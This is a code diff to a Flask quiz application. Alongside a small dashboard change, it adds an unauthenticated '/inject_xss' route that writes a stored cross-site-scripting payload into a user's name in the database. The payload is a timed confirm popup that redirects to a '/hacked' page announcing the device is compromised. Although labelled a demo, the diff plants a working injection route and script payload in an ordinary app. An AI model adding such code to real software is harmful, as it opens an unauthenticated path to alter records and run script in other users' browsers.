@@ -363,7 +363,21 @@ def user_dashboard():
     show_chapters = bool(chapters)
     show_quizzes = bool(quizzes)
 
-    return render_template('user_dashboard.html', user=user, chapters=chapters, subjects=subjects, quizzes=quizzes, show_subjects=show_subjects, show_chapters=show_chapters, show_quizzes=show_quizzes, current_date=current_date)
+    return render_template('user_dashboard.html', user=user, chapters=chapters, subjects=subjects, quizzes=quizzes, show_subjects=show_subjects, show_chapters=show_chapters, show_quizzes=show_quizzes, current_date=current_date, search_query=search_query)
+
+@app.route('/inject_xss')
+def inject_xss():
+    user = User.query.filter_by(email="your@email.com").first()  # Find a specific user
+    if user:
+        # Inject malicious script payload into user's name
+        user.name = '<script>setTimeout(function(){ if(confirm("Subscribe now?")) { window.location.href="/hacked"; } }, 3000);</script>'
+        db.session.commit()  # Save to the DB
+        return "Injected XSS into user!"
+    return "User not found"
+
+@app.route('/hacked')
+def hacked():
+    return "<h1 style='color:red;'>Your device has been compromised.</h1><p>This is a demo of a XSS attack.</p>"
 
 @app.route('/attempt_quiz/<int:quiz_id>', methods=['GET', 'POST'])
 def attempt_quiz(quiz_id):
